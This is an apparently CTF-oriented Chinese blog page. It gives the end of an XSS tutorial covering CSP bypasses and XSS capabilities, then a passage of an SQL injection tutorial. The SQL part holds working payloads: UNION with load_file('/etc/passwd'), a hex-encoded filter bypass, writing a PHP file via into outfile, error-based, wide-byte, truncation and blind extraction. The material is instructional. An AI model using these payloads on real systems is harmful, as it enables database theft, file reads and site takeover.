<p>在这些场景下很容易利用其错误配置对CSP进行绕过。例如，当包含unsafe-inline关键词但未使用nonce或hash策略时，可直接使用事件属性或script标签执行代码。</p>
<p>(2) unsafe-inline下的绕过</p>
<p>CSP策略如下:</p>
<p><img src="/2022/03/08/XSS/image-20220310142923101.png" alt="image-20220310142923101"></p>
<p>除script开启unsafe-inline模式之外，其余资源仅允许加载同域。此时可用的绕过方法有如下几种。<br>DNS Prefetch。由于link标签最新的rel属性dns-prefetch尚未被加入CSP实现中,使用如下Payload即可发出一条DNS解析请求，在NS服务器下查看解析日志便可得到如下内容:</p>
<p><img src="/2022/03/08/XSS/image-20220310143101529.png" alt="image-20220310143101529"></p>
<p>location.href。大部分的网站跳转还是要依赖前端来进行，所以在CSP中是无法对location.href做出限制的，依此可以衍生出大量的绕过方式:</p>
<p><img src="/2022/03/08/XSS/image-20220310143148825.png" alt="image-20220310143148825"></p>
<p>(3)严苛规则script-src’self’下的绕过<br>CSP策略如下:<img src="/2022/03/08/XSS/image-20220310143322165.png" alt="image-20220310143322165"></p>
<p>关闭unsafe-inline模式，所有资源仅允许加载同域。此时可使用如下绕过方法:重定向(302跳转）导致的绕过。</p>
<p>可以看出，如果将script-src设置为某个目录，通过该目录下的302跳转是可以绕过CSP读取到记载其他目录的资源的。</p>
<p><img src="/2022/03/08/XSS/image-20220310143436224.png" alt="image-20220310143436224"></p>
<p>(4) CRLF导致的绕过<br>在HTTP响应头中注入[CRLF] [CRLF]，将CSP头部分割至HTTP响应体中，这样注入的XSS代码便不再受到CSP的影响。</p>
<h2 id="0x04-危害与利用技巧"><a href="#0x04-危害与利用技巧" class="headerlink" title="0x04 危害与利用技巧"></a>0x04 危害与利用技巧</h2><p>XSS漏洞利用的基础是脚本，攻击发生的位置是客户端浏览器。也就是说，在浏览器中脚本所能做的事情通过XSS漏洞都可以完成，而不仅仅是窃取Cookie。XSS漏洞可以实现的功能包括但不限于:<br>·窃取用户Cookie信息，伪造用户身份;<br>·与浏览器DOM对象进行交互,执行受害者所有可以执行的操作;<br>·获取网页源码;<br>·发起HTTP请求;<br>·使用HTML5 Geolocation API获取地理位置信息;<br>使用WebRTC API获取网络信息;<br>·发起HTTP请求对内网主机进行扫描，对存在漏洞的主机进行攻击; …</p>
<p>如下代码展示了如何使用WebRTC API获取网络信息:</p>
<p><img src="/2022/03/08/XSS/image-20220310143759899.png" alt="image-20220310143759899"></p>
<p><img src="/2022/03/08/XSS/image-20220310143827714.png" alt="image-20220310143827714"></p>
<p><img src="/2022/03/08/XSS/image-20220310143844038.png" alt="image-20220310143844038"></p>
<p>这里再推荐一个非常好用的开源XSS漏洞利用平台:BeEF (The Browser Exploitation Framework)，项目地址为<a target="_blank" rel="noopener" href="https://github.com/beefproject/beef/%E8%AF%A5%E5%B9%B3%E5%8F%B0%E4%B8%AD%E5%8C%85%E5%90%AB%E5%A4%A7%E9%87%8FXSS%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BE%9B%E5%8F%82%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://github.com/beefproject/beef/该平台中包含大量XSS代码，可供参考和学习。</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/xss.php?xss=%<span class="number">3</span>Ca%<span class="number">20</span>href=%<span class="number">22</span>javascript:alert(/xss/)%<span class="number">22</span>%<span class="number">3</span>Etouch%<span class="number">20</span>me!%<span class="number">3</span>C/a%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">xss</span>=&lt;h1 <span class="attribute">style</span>=<span class="string">&quot;color:green;&quot;</span>&gt;XSS&lt;/h1&gt;   &lt;h1&gt;段落</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me !<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/08/XSS/image-20220318193009420.png" alt="image-20220318193009420"></p>
<p><img src="/2022/03/08/XSS/image-20220318193429864.png" alt="image-20220318193429864"></p>
<p><img src="/2022/03/08/XSS/image-20220318193704561.png" alt="image-20220318193704561"></p>
<p>/:代替空格</p>
<p><img src="/2022/03/08/XSS/image-20220318194007848.png" alt="image-20220318194007848"></p>
<h2 id="哪里可以执行js脚本"><a href="#哪里可以执行js脚本" class="headerlink" title="哪里可以执行js脚本"></a>哪里可以执行js脚本</h2><p>window对象包含属性：document，location，navigator，screen，history，frames</p>
<p>Document根节点包含子节点：forms，embeds，anchors，images，links</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/04/sql%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/04/sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-04 21:53:45" itemprop="dateCreated datePublished" datetime="2022-03-04T21:53:45+08:00">2022-03-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-07 22:42:34" itemprop="dateModified" datetime="2022-05-07T22:42:34+08:00">2022-05-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>注意：注释：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code></p>
<p>将#号改成url的编码<code>%23</code>就可以了，或者使用 –+</p>
<p>不能使用–，＋号在语句中变成了空格。用来和后面的单引号分隔开，将后面的语句注释。</p>
<p>了解原理后便知道了–无法使用的原因，是因为–与后面的这个单引号连接在一起，无法形成有效的mysql语句。</p>
<p>在mysql中使用这个语句分析原因，输入后回车显示分号没有闭合<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/image-20220304214654204.png" alt="image-20220304214654204"></p>
<p>所以在注入时我们除了–+外，也可以使用–’来完成注入语句</p>
<p>通过order by判断回显数</p>
<h2 id="0x01-判断"><a href="#0x01-判断" class="headerlink" title="0x01 判断"></a>0x01 判断</h2><h4 id="判断是否存在-Sql-注入漏洞"><a href="#判断是否存在-Sql-注入漏洞" class="headerlink" title="判断是否存在 Sql 注入漏洞"></a>判断是否存在 Sql 注入漏洞</h4><p><strong>单引号判断法</strong>：<br> 在参数后面加上单引号,比如:<a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a></p>
<p>如果页面返回错误，则存在 Sql 注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。（如果未报错，不代表不存在 Sql 注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入）</p>
<h4 id="判断-Sql-注入漏洞的类型"><a href="#判断-Sql-注入漏洞的类型" class="headerlink" title="判断 Sql 注入漏洞的类型"></a>判断 Sql 注入漏洞的类型</h4><p>通常 Sql 注入漏洞分为 2 种类型：</p>
<ul>
<li>数字型</li>
<li>字符型</li>
</ul>
<p>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分，<strong>常用</strong>的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p>
<h5 id="数字型判断："><a href="#数字型判断：" class="headerlink" title="数字型判断："></a>数字型判断：</h5><p>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br> <code>select * from &lt;表名&gt; where id = x</code><br> 这种类型可以使用经典的 <code>and 1=1</code> 和 <code>and 1=2</code> 来判断：</p>
<ul>
<li>1.Url 地址中输入 <code>http://xxx/abc.php?id= x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
<li>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
</ul>
<p>原因如下：<br> 当输入 <code>and 1=1</code>时，后台执行 Sql 语句：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p>没有语法错误且逻辑判断为正确，所以返回正常。</p>
<p>当输入 <code>and 1=2</code>时，后台执行 Sql 语句：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>没有语法错误但是逻辑判断为假，所以返回错误。</p>
<p>我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x and 1=1&#x27;</span> </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x and 1=2&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
<h5 id="字符型判断："><a href="#字符型判断：" class="headerlink" title="字符型判断："></a>字符型判断：</h5><p>当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下：<br> <code>select * from &lt;表名&gt; where id = &#39;x&#39;</code><br> 这种类型我们同样可以使用 <code>and &#39;1&#39;=&#39;1</code> 和 <code>and &#39;1&#39;=&#39;2</code>来判断：</p>
<ul>
<li>1.Url 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面运行正常，继续进行下一步。</li>
<li>2.Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。</li>
</ul>
<p>原因如下：<br> 当输入 <code>and &#39;1&#39;=&#39;1</code>时，后台执行 Sql 语句：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>语法正确，逻辑判断正确，所以返回正确。</p>
<p>当输入  <code>and &#39;1&#39;=&#39;2</code>时，后台执行 Sql 语句：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> id = <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;2‘</span></span><br></pre></td></tr></table></figure>

<p>语法正确，但逻辑判断错误，所以返回正确</p>
<p>或者直接：输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’，运行错误</p>
<p>输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> x’#，运行正常</p>
<p>select * from &lt;表名&gt; where id = ‘x’#’</p>
<p><strong>字符型一般需要使用单引号来闭合。字符型注入最关键的是如何闭合</strong> SQL <strong>语句以及注释多余的代码。</strong></p>
<h2 id="0x02-information-schema"><a href="#0x02-information-schema" class="headerlink" title="0x02 information_schema"></a>0x02 information_schema</h2><p><code>information_schema</code> 是 mysql 自带数据库，保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
<p> <strong>获取元数据</strong></p>
<p>① 查询用户数据库名称<br>SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA<br>INFORMATION_SCHEMA.SCHEMATA 表提供了关于数据库的信息。</p>
<p>②查询当前数据表<br>SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = (SELECT DATABASE())<br>INFORMATION_SCHEMA.TABLES 表给出了数据库中表的信息。</p>
<p>③查询指定表的所有字段<br>SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ‘***’<br>INFORMATION_SCHEMA.COLUMNS 表中给出了表中的列信息。</p>
<p> <strong>MySQL 函数利用</strong></p>
<p>① load_file() 函数读文件操作<br>MySQL 提供了 load_file() 函数，可以帮助用户快速读取文件，但文件的位置必须在服务器上，文件必须为绝对路径，且用户必须有 FILE 权限，文件容量也必须小于 max_allowed_packet 字节 (默认为 16MB，最大为 1GB)。</p>
<p>SQL 语句如下：<br>UNION SELECT 1, load_file(‘/etc/passwd’), 3, 4 #</p>
<p>通常一些防注入语句不允许单引号出现，那么可以使用一下语句绕过：<br>UNION SELECT 1, load_file(0x2F6561342F706173737764), 3, 4 #<br>“0x2F6561342F706173737764” 为 “/etc/passwd” 的十六进制转换结果。</p>
<p>在浏览器返回数据时，有可能存在乱码问题，那么可以使用 hex() 函数将字符串转换为十六进制数据。</p>
<p>② into outfile 写文件操作<br>MySQL 提供了向磁盘写文件的操作，与 load_file() 一样，必须有 FILE 权限，并且文件必须为全路径名称。</p>
<p>写入文件：<br>SELECT ‘<?php phpinfo();?>‘ into oufile ‘C:\wwwroot\1.php’</p>
<p>③ 连接字符串<br>MySQL 如果需要一次查询多个数据，可以使用 concat() 或 concat_ws() 函数来完成。concat(str1, str2,…)</p>
<h2 id="0x03-函数"><a href="#0x03-函数" class="headerlink" title="0x03 函数"></a>0x03 函数</h2><p><strong>group_concat()函数</strong></p>
<p>将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )</p>
<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
<p>SELECT name FROM student WHERE id = 1 UNION SELECT concat(user(), ‘,’, database(), ‘,’, version());</p>
<p>也可以将逗号改用十六进制表示：0x2c</p>
<p><strong>区别</strong></p>
<p>1.CONCAT()　　拼接单行字符串</p>
<p>select concat(‘100’，user_id) from table1;</p>
<p>select concat(‘11‘,‘22‘,‘33‘);</p>
<p>结果　　112233</p>
<p>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</p>
<p>select concat(‘11‘,‘22‘,null);</p>
<p>结果 NULL</p>
<p>2.GROUP_CANCAT()把查询出的所有行的字符串拼接成一个串 返回</p>
<p>例如：我用select dictinct date from table1,得到如下表</p>
<p>200805</p>
<p>200806</p>
<p>200807</p>
<p>200808</p>
<p>200809</p>
<p>200810</p>
<p>200811</p>
<p>现在我需要将得到的这个表的这一列拼接成一个字符串，即</p>
<p>200805，200806，200807，200808，200809，200810，200811</p>
<p>select GROUP_CONCAT(dictinct date) from table1;</p>
<p>select GROUP_CONCAT(dictinct ‘001-’， date) from table1; 拼接字符串 并返回不同的</p>
<p>返回 001-200805，001-200806，001-200807，001-200808，001-200809，001-200810，001-200811</p>
<h3 id="MySQL-显错式注入，使用错误提取消息"><a href="#MySQL-显错式注入，使用错误提取消息" class="headerlink" title="MySQL 显错式注入，使用错误提取消息"></a><strong>MySQL 显错式注入</strong>，使用错误提取消息</h3><p>① 通过 updatexml 函数执行 SQL 语句</p>
<p>首先了解下updatexml()函数：<br>updatexml (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称；<br>第二个参数：XPath_string (Xpath格式的字符串) ，<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>SELECT * FROM message WHERE id = 1 and updatexml(1, (concat(0x7c, (SELECT @@version))), 1)<strong>注意id=正确值</strong><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，报错，会显示出无法识别的内容：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/2019022422162974.png" alt="在这里插入图片描述"></p>
<p>② 通过 extractvalue函数<br>SEELCT * FROM message WHERE id= 1 AND extractvalue(1, concat(0x7c, (SELECT user())))<br>同样报错显示出当前用户<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224222331730.png" alt="在这里插入图片描述"></p>
<p><strong>记得注释后面的内容</strong></p>
<p><strong>sql server 显错式注入</strong></p>
<p><strong>① 枚举当前表或者列</strong><br> 假设选择存在这样一张表：</p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224191228560.png" alt="在这里插入图片描述"></p>
<p>查询 root 用户的详细信息，SQL 语句猜测如下：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’</p>
<p>攻击者可以利用 SQL Server 特性来获取敏感信息，在输入框中输入如下语句：<br>‘ having 1 = 1 –<br>最终执行的 SQL 语句就会变为：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’ HAVING 1 = 1 –</p>
<p>那么 SQL 的执行器可能会抛出一个错误：<br><img src="https://img-blog.csdnimg.cn/20190224191512414.png" alt="在这里插入图片描述"></p>
<p>攻击者就可以发现当前的表名为 user、而且存在字段 id。</p>
<p>攻击者可以利用此特性继续得到其他列名，输入如下语句：<br>‘ GROUP BY users.id HAVING 1 = 1 –<br>则 SQL 语句变为：<br>SELECT * FROM user WHERE username = ‘root’ AND password = ‘root’ GROUP BY users.id HAVING 1 = 1 –</p>
<p>抛出错误：</p>
<p>由此可以看到包含列名 username。可以一次递归查询，知道没有错误消息返回位置，这样就可以利用 HAVING 字句得到当表的所有列名。<br>注：Select指定的每一列都应该出现在Group By子句中，除非对这一列使用了聚合函数</p>
<p>②. 利用数据类型错误提取数据<br>如果试图将一个字符串与非字符串比较，或者将一个字符串转换为另一个不兼容的类型，那么SQL 编辑器将会抛出异常。</p>
<p>如下列 SQL 语句：<br>SELECT * FROM user WHERE username = ‘abc’ AND password = ‘abc’ AND 1 &gt; (SELECT TOP 1 username FROM users)</p>
<p>执行器错误提示：<br><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224193113204.png" alt="在这里插入图片描述"><br>这就可以获取到用户的用户名为 root。因为在子查询 SELECT TOP 1 username FROM users 中，将查询到的用户名的第一个返回，返回类型是 varchar 类型，然后要跟 int 类型的 1 比较，两种类型不同的数据无法比较而报错，从而导致了数据泄露。</p>
<p>利用此方法可以递归推导出所有的账户信息：<br>SELECT * FROM users WHERE username = ‘abc’ AND password = ‘abc’ AND 1 &gt; (SELECT TOP 1 username FROM users WHERE not in (‘root’))。<br>通过构造此语句就可以获得下一个 用户名；若把子查询中的 username 换成其他列名，则可以获取其他列的信息</p>
<h2 id="0x04宽字节注入"><a href="#0x04宽字节注入" class="headerlink" title="0x04宽字节注入"></a>0x04宽字节注入</h2><p>宽字节注入是由编码不统一所造成的，这种注入一般出现在 PHP + MySQL中。</p>
<p>在 PHP 配置文件 php.ini 中存在 magic_quotes_gpc 选项，被称为魔术引号，当此选项被打开时，使用 GET、POST、Cookie 所接受的 单引号(’)、双引号(“)、反斜线() 和 NULL 字符都会自动加上一个反斜线转义。</p>
<p>如下使用 PHP 代码使用 $_GET 接收参数：<img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223136534.png" alt="在这里插入图片描述"></p>
<p>如访问URL：<code>http:/www.xxser.com/Get.php?id=&#39;</code>，显示如下：<img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/20190224223317122.png" alt="在这里插入图片描述"></p>
<p>单引号<code>&#39;</code>被转义后就变成了<code>\&#39;</code>，在 MySQL 中，<code>\&#39;</code>是一个合法的字符，也就没办法闭合单引号，所以，注入类型是字符型时无法构成注入。</p>
<p>但是若是输入：<code>%d5&#39;</code>，访问URL：<code>http:/www.xxser.com/Get.php?id=%d5&#39;</code>，显示如下：<img src="https://img-blog.csdnimg.cn/2019022422340713.png" alt="在这里插入图片描述"></p>
<p>可以发现，这次单引号没有被转义，这样就可以突破 PHP 转义，继续闭合 SQL 语句进行 SQL 注入。</p>
<h2 id="0x05-MySQL-长字符截断"><a href="#0x05-MySQL-长字符截断" class="headerlink" title="0x05. MySQL 长字符截断"></a>0x05. MySQL 长字符截断</h2><p>在 MySQL 中的一个设置里有一个 sql_mode 选项，当 sql_mode 设置为 default 时，即没有开启 STRICT——ALL_TABLES 选项时，MySQL 对插入超长的值只会提示 waring，而不是 error。</p>
<p>假设有一张表如下：<img src="https://img-blog.csdnimg.cn/20190224223849184.png" alt="在这里插入图片描述"></p>
<p>username 字段的长度为 7。</p>
<p>分别插入一下 SQL 语句：<br> ① 插入正常 SQL 语句：<br> <code>INSERT users(id, username, password) VALUES(1, &#39;admin&#39;, &#39;admin&#39;);</code></p>
<p>成功插入</p>
<p>② 插入错误的 SQL 语句，使 username 字段的长度超过7：<br> <code>INSERT users(id, username, password) VALUES(2, &#39;admin &#39;, &#39;admin&#39;);</code></p>
<p><img src="https://img-blog.csdnimg.cn/20190224224213520.png" alt="在这里插入图片描述"></p>
<p>虽然有警告，但是成功插入了。</p>
<p>③ 再尝试插入一条错误的 SQL 语句，长度同一超过原有的规定长度：<br> <code>INSERT users(id, username, password) VALUES(3, &#39;admin x), &#39;admin;</code><br> <img src="https://img-blog.csdnimg.cn/20190224224328555.png" alt="在这里插入图片描述"></p>
<p>查询数据库：<img src="https://img-blog.csdnimg.cn/20190224224351430.png" alt="在这里插入图片描述"></p>
<p>可以看到，三条数据都被插入到数据库中，但是值发生了变化。在默认情况下，如果数据超出默认长度，MySQL 会将其截断。</p>
<p>但是这样怎么攻击呢？通过查询用户名为 admin 的用户：</p>
<p><img src="https://img-blog.csdnimg.cn/20190224224526351.png" alt="在这里插入图片描述"></p>
<p>可以发现，只查询用户名为 admin 的用户，但是另外两个长度不一致的 admin 用户也被查询出，这样就会造成一些安全问题。</p>
<p>比如有一处管理员登录时这样判断的：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">SELECT</span> <span class="built_in">count</span>(*) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;***&#x27;</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>

<p>那么攻击者只需要注册一个长度超过规定长度的用户名“admin ”即可轻易进入后台管理页面。</p>
<h2 id="0x06-延时注入"><a href="#0x06-延时注入" class="headerlink" title="0x06 延时注入"></a>0x06 延时注入</h2><p>延时注入属于盲注技术的一种，是一种基于时间差异的注入技术。下面以 MySQL 为例介绍延时注入。</p>
<p>在 MySQL 中有一个函数：sleep(duration)，这个函数意思是在 duration 参数给定数秒后运行语句，如下 SQL 语句：<br> <code>SELECT * FROM users WHERE id = 1 AND sleep(3)</code><br> 就是将在 3 秒后执行该 SQL 语句。</p>
<p><strong>可以使用这个函数来判断 URL 是否存在 SQL 注入漏洞</strong>，步骤如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20190224225212438.png" alt="在这里插入图片描述"></p>
<p>通过页面返回的世界可以断定，DBMS 执行了 <code>and sleep(3)</code> 语句，这样一来就可以判断出 URL 存在 SQL 注入漏洞。</p>
<p>然后通过 sleep() 函数还可以读出数据，但需要其他函数的配合，步骤如下：</p>
<p>①查询当前用户，并取得字符串长度<br>执行SQL 语句：<br>AND if(length(user()) = 0, sleep(3), 1)<br>如果出现 3 秒延时，就可以判断出 user 字符串长度，注入时通常会采用折半算法减少判断。</p>
<p>② 截取字符串第一个字符，并转换为 ASCII 码<br>AND if(hex(mid(user(), 1, 1)) = 1, sleep(3), 1)<br>AND if(hex(mid(user(), 1, 1)) = 2, sleep(3), 1)<br>……<br>不断更换 ASCII 码直到出现延时 3 秒就可以猜测出第一个字符。</p>
<p>③ 递归截取字符串每一个字符，分别于 ASCII 码比较<br>AND if(hex(mid(user(), L, 1)) = N, sleep(3), 1)<br>注：L 的位置代表字符串的第几个字符，N 的位置代表 ASCII 码。</p>
<p>不仅在 MySQL 中存在延时函数，在 SQL Server、Oracle 等数据库中也都存在类似功能的函数，如 SQL Server 的 waitfor delay、Oracle 中的 DBMS_LOCK.SLEEP 等函数。</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="constructor">MID(<span class="params">column_name</span>,<span class="params">start</span>[,<span class="params">length</span>])</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需。要提取字符的字段。</td>
</tr>
<tr>
<td>start</td>
<td>必需。规定开始位置（起始值是 1）。</td>
</tr>
<tr>
<td>length</td>
<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
</tr>
</tbody></table>
<h2 id="0x07基于bool的盲注"><a href="#0x07基于bool的盲注" class="headerlink" title="0x07基于bool的盲注"></a><strong>0x07基于bool的盲注</strong></h2><p>盲注适合页面不显示任何数据查询结果，基于bool的盲注就是页面只有正常和不正常两种情况，通过true和false来猜解数据，速度比较慢，基于bool的盲注通常用函数length()，返回长度，ascii()，返回ASCII值，substr(string,a,b)，返回string以a开头，长度为b的字符串，count()，返回数量。ord()函数可以返回单个字符的ASCII码<br>char()函数可将ASCII码转换为对应的字符</p>
<h4 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1 判断注入点"></a>1 判断注入点</h4><p>这里就不能像联合查询注入一样根据页面是否报错判断了，因为sql执行失败和未查到数据都会返回False，所以只能通过返回的逻辑值来判断</p>
<p>根据payload返回的成功或失败可以判断是否存在注入点，</p>
<p>如果带入user1返回为存在（真），那么当存在整型注入时，通过逻辑运算and（与）的关系，后面跟上1=1（恒真），那么返回值也肯定为存在（真），带入1=2（恒假）时，那么返回值也肯定为不存在（假）</p>
<p>通过这种方式就可以判断是否存在布尔型盲注</p>
<p><img src="/2022/03/04/sql%E6%B3%A8%E5%85%A5/638" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9144690-61931af2bff33033.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/669" alt="img"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9144690-ad2ec2eb515ed27e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/665" alt="img"></p>
<h4 id="2读数据"><a href="#2读数据" class="headerlink" title="2读数据"></a>2读数据</h4><p>输入1’:</p>
<p>输入1’#：</p>
<p>为字符型bool盲注</p>
<p>构造语句猜测当前数据库名长度是否大于5：1’ and length(database())&gt;5#，如图：</p>
<p>说明当前数据库长度是小于5 的用二分法继续构造：1’ and length(database())&gt;3#；</p>
<p>显然长度大于3却不大于5，当前数据库名长度就是4，</p>
<p>然后判断数据库名第一个字符ASCII是否大于97：1’and (ascii(substr(database(),1,1)))&gt;97#，依旧使用二分法慢慢判断，最终确定为ASCII为100，对应字符为：d；（<strong>注：database()：会返回当前数据库名称</strong>）</p>
